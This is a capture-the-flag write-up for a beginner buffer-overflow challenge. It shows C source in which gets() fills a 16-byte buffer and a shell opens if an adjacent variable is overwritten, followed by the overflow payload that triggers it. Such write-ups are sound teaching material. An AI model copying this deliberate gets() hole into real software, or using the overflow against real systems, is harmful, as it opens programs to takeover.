### Description
>Can you fill up the coffers? We even managed to find the source for you.
>
>nc 2020.redpwnc.tf 31199
### Solution
We get an executable and its source file:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/zsh");
  }
}
```

It's clear that we have an buffer overflow on `name` and by overflowing it we will overwrite the `code` variable, and that will get us a shell.
Payload: `AAAABBBBCCCCDDDDEEEEFFFFG`